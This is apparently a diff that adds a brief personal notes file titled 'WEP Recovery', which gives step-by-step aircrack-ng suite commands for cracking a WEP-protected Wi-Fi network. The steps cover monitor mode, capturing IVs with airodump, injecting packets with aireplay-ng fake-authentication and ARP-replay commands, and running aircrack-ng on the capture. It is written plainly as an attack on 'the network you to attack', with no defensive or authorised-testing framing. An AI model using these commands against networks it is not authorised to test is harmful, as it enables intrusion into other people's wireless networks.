@@ -1,0 +1,14 @@
+WEP Recovery
+
+1) GO into monitor mode
+
+2) airodump the network you to attack will including the write switch
+
+3) we need to catch as many IVs as we can as much as 20,000 will do but ideally 100,000 is best.
+--To speed up the prosses of catching IVs we will issue the aireplay command
+"aireplay-ng -1 0 -e (ESSID) -a (BSSID) (interface such as wlan0mon"
+
+4) After issuing the previous command we will issue another command
+"aireplay-ng -3 -b (bssid) (interface)"
+
+5) simply run aircrack-ng name of file.cap and crack!!! 
